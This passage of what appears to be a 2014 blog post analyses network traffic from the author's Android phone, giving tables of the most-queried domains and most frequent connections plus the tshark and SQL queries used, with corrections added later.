&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    21
  &lt;/th&gt;

  &lt;td&gt;
    50
  &lt;/td&gt;

  &lt;td&gt;
    polpix.sueddeutsche.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    22
  &lt;/th&gt;

  &lt;td&gt;
    45
  &lt;/td&gt;

  &lt;td&gt;
    bilder1.n-tv.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    23
  &lt;/th&gt;

  &lt;td&gt;
    45
  &lt;/td&gt;

  &lt;td&gt;
    feeds.reuters.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    24
  &lt;/th&gt;

  &lt;td&gt;
    45
  &lt;/td&gt;

  &lt;td&gt;
    www.tagesschau.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    25
  &lt;/th&gt;

  &lt;td&gt;
    40
  &lt;/td&gt;

  &lt;td&gt;
    mobile.twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    26
  &lt;/th&gt;

  &lt;td&gt;
    40
  &lt;/td&gt;

  &lt;td&gt;
    mtalk.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    27
  &lt;/th&gt;

  &lt;td&gt;
    40
  &lt;/td&gt;

  &lt;td&gt;
    s2.googleusercontent.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    28
  &lt;/th&gt;

  &lt;td&gt;
    40
  &lt;/td&gt;

  &lt;td&gt;
    www.googleadservices.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    29
  &lt;/th&gt;

  &lt;td&gt;
    35
  &lt;/td&gt;

  &lt;td&gt;
    bilder2.n-tv.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    30
  &lt;/th&gt;

  &lt;td&gt;
    35
  &lt;/td&gt;

  &lt;td&gt;
    bilder3.n-tv.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    31
  &lt;/th&gt;

  &lt;td&gt;
    35
  &lt;/td&gt;

  &lt;td&gt;
    bilder4.n-tv.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    32
  &lt;/th&gt;

  &lt;td&gt;
    35
  &lt;/td&gt;

  &lt;td&gt;
    ecx.images-amazon.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    33
  &lt;/th&gt;

  &lt;td&gt;
    30
  &lt;/td&gt;

  &lt;td&gt;
    cdn1.spiegel.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    34
  &lt;/th&gt;

  &lt;td&gt;
    30
  &lt;/td&gt;

  &lt;td&gt;
    cdn2.spiegel.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    35
  &lt;/th&gt;

  &lt;td&gt;
    30
  &lt;/td&gt;

  &lt;td&gt;
    e.crashlytics.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    36
  &lt;/th&gt;

  &lt;td&gt;
    30
  &lt;/td&gt;

  &lt;td&gt;
    weather.yahooapis.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    37
  &lt;/th&gt;

  &lt;td&gt;
    30
  &lt;/td&gt;

  &lt;td&gt;
    www.amazon.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    38
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    api.twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    39
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    clients4.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    40
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    e12.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    41
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    e16.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    42
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    e4.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    43
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    mobile.smartadserver.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    44
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    photos-d.ak.fbcdn.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    45
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    scontent-a.xx.fbcdn.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    46
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    www.facebook.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    47
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    www.fahrinfo-berlin.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    48
  &lt;/th&gt;

  &lt;td&gt;
    25
  &lt;/td&gt;

  &lt;td&gt;
    www.google-analytics.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    49
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    apis.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    50
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    cdn3.spiegel.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    51
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    cdn4.spiegel.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    52
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    de.sitestat.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    53
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    e10.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    54
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    e11.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    55
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    e13.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    56
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    e3.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    57
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    e9.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    58
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    fbcdn-profile-a.akamaihd.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    59
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    googleads.g.doubleclick.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    60
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    gwp.nuggad.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    61
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    imap.gmail.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    62
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    img.welt.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    63
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    media0.faz.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    64
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    oauth.googleusercontent.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    65
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    p5.focus.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    66
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    script.ioam.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    67
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    ssl.gstatic.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    68
  &lt;/th&gt;

  &lt;td&gt;
    20
  &lt;/td&gt;

  &lt;td&gt;
    www.golem.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    69
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    accounts.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    70
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    api.facebook.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    71
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    api.tunigo.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    72
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    cdn.api.twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    73
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    connect.facebook.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    74
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    de.ioam.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    75
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    dl.google.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    76
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e1.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    77
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e14.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    78
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e2.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    79
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e6.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    80
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e7.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    81
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    e8.whatsapp.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    82
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    gdata.youtube.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    83
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    getpocket.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    84
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    images.zeit.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    85
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    m.faz.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    86
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    media1.faz.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    87
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    p.twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    88
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    platform.twitter.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    89
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    scontent-b.xx.fbcdn.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    90
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    stats.g.doubleclick.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    91
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    sueddeut.ivwbox.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    92
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    sz.met.vgwort.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    93
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    tags.w55c.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    94
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    www.faz.net
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    95
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    www.heute.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    96
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    www.sueddeutsche.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    97
  &lt;/th&gt;

  &lt;td&gt;
    15
  &lt;/td&gt;

  &lt;td&gt;
    www.taz.de
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    98
  &lt;/th&gt;

  &lt;td&gt;
    10
  &lt;/td&gt;

  &lt;td&gt;
    a0.twimg.com
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
  &lt;th&gt;
    99
  &lt;/th&gt;

  &lt;td&gt;
    10
  &lt;/td&gt;

  &lt;td&gt;
    api.geo.kontagent.net
  &lt;/td&gt;
&lt;/tr&gt;
</code></pre>
  </table>
</div>
<h3 id="top-100-connections">Top 100 connections</h3>
<p><strong>EDIT [2014-01-27]:</strong> There are some errors regarding the following SQL query. These numbers haven&rsquo;t been updated yet. I have done some filtering for the domain <code>googleapis.com</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dig googleapis.com
....
$ tshark -r merged.pcap -Y &#34;ip.dst==173.194.113.147/24&#34; -E header=y &gt;&gt; googleapis.csv
$ wc -l googleapis.csv
3017 googleapis.csv
</code></pre></div><p>So there were only 3016 packets for the domain <code>googleapis.com</code> and <strong>not</strong> 5 Mil.Â </p>
<p><strong>EDIT [2014-02-02]:</strong> The SQL query has been updated. There was some mistake during the JOIN between the &lsquo;dns&rsquo; and &lsquo;connection&rsquo; tables. Below is the new query:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p_testing<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(*), (SELECT dns_query FROM dns WHERE dns_response=c.dst LIMIT 1) as DNS, c.dstport, c.frame_protocols FROM connection AS c
</span><span style="color:#ed9d13">    WHERE c.dst NOT LIKE &#34;</span><span style="color:#3677a9">10</span>.%<span style="color:#ed9d13">&#34;
</span><span style="color:#ed9d13">    GROUP by 2
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p_testing.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><p><strong>Old</strong> query:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p2<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(c.dst), d.dns_query, c.dstport, c.frame_protocols FROM connection AS c
</span><span style="color:#ed9d13">    JOIN dns AS d ON c.dst=d.dns_response
</span><span style="color:#ed9d13">    WHERE c.frame_protocols LIKE &#34;</span>sll:ip:tcp:%<span style="color:#ed9d13">&#34;
</span><span style="color:#ed9d13">    GROUP by c.dst
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p2.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
        <tr align="left">
          <th>
            Â 
          </th>
<pre><code>      &lt;th&gt;
        COUNT(*)
      &lt;/th&gt;

      &lt;th&gt;
        DNS
      &lt;/th&gt;

      &lt;th&gt;
        dstport
      &lt;/th&gt;

      &lt;th&gt;
        frame_protocols
      &lt;/th&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;0
      &lt;/th&gt;

      &lt;td&gt;
        5570
      &lt;/td&gt;

      &lt;td&gt;
        cdn.flipboard.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        1
      &lt;/th&gt;

      &lt;td&gt;
        5248
      &lt;/td&gt;

      &lt;td&gt;
        orcart.facebook.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        2
      &lt;/th&gt;

      &lt;td&gt;
        4670
      &lt;/td&gt;

      &lt;td&gt;
        fbprod.flipboard.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        3
      &lt;/th&gt;

      &lt;td&gt;
        4446
      &lt;/td&gt;

      &lt;td&gt;
        www.googleapis.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        4
      &lt;/th&gt;

      &lt;td&gt;
        4418
      &lt;/td&gt;

      &lt;td&gt;
        graph.facebook.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        5
      &lt;/th&gt;

      &lt;td&gt;
        2744
      &lt;/td&gt;

      &lt;td&gt;
        media1.faz.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        6
      &lt;/th&gt;

      &lt;td&gt;
        2642
      &lt;/td&gt;

      &lt;td&gt;
        None
      &lt;/td&gt;

      &lt;td&gt;
        NaN
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:icmp:ip:udp:dns
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        7
      &lt;/th&gt;

      &lt;td&gt;
        2477
      &lt;/td&gt;

      &lt;td&gt;
        www.google.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        8
      &lt;/th&gt;

      &lt;td&gt;
        2016
      &lt;/td&gt;

      &lt;td&gt;
        polpix.sueddeutsche.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        9
      &lt;/th&gt;

      &lt;td&gt;
        1722
      &lt;/td&gt;

      &lt;td&gt;
        r6&amp;#8212;sn-i5onxoxu-q0nl.googlevideo.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        10
      &lt;/th&gt;

      &lt;td&gt;
        1277
      &lt;/td&gt;

      &lt;td&gt;
        android.clients.google.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp:ssl
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        11
      &lt;/th&gt;

      &lt;td&gt;
        1264
      &lt;/td&gt;

      &lt;td&gt;
        ad.flipboard.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        12
      &lt;/th&gt;

      &lt;td&gt;
        1191
      &lt;/td&gt;

      &lt;td&gt;
        platform.twitter.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        13
      &lt;/th&gt;

      &lt;td&gt;
        989
      &lt;/td&gt;

      &lt;td&gt;
        www.google-analytics.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp:ssl
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        14
      &lt;/th&gt;

      &lt;td&gt;
        986
      &lt;/td&gt;

      &lt;td&gt;
        www.thisiscolossal.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        15
      &lt;/th&gt;

      &lt;td&gt;
        902
      &lt;/td&gt;

      &lt;td&gt;
        feeds.reuters.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        16
      &lt;/th&gt;

      &lt;td&gt;
        856
      &lt;/td&gt;

      &lt;td&gt;
        www.tagesschau.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        17
      &lt;/th&gt;

      &lt;td&gt;
        762
      &lt;/td&gt;

      &lt;td&gt;
        i1.ytimg.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        18
      &lt;/th&gt;

      &lt;td&gt;
        727
      &lt;/td&gt;

      &lt;td&gt;
        images03.futurezone.at
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        19
      &lt;/th&gt;

      &lt;td&gt;
        725
      &lt;/td&gt;

      &lt;td&gt;
        cdn2.spiegel.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        20
      &lt;/th&gt;

      &lt;td&gt;
        701
      &lt;/td&gt;

      &lt;td&gt;
        cdn.blog.malwarebytes.org
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        21
      &lt;/th&gt;

      &lt;td&gt;
        676
      &lt;/td&gt;

      &lt;td&gt;
        ticks2.bugsense.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        22
      &lt;/th&gt;

      &lt;td&gt;
        557
      &lt;/td&gt;

      &lt;td&gt;
        www.taz.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        23
      &lt;/th&gt;

      &lt;td&gt;
        513
      &lt;/td&gt;

      &lt;td&gt;
        cdn4.spiegel.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        24
      &lt;/th&gt;

      &lt;td&gt;
        481
      &lt;/td&gt;

      &lt;td&gt;
        mtalk.google.com
      &lt;/td&gt;

      &lt;td&gt;
        5228
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp:data
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        25
      &lt;/th&gt;

      &lt;td&gt;
        478
      &lt;/td&gt;

      &lt;td&gt;
        www.theverge.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        26
      &lt;/th&gt;

      &lt;td&gt;
        461
      &lt;/td&gt;

      &lt;td&gt;
        i.imgur.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
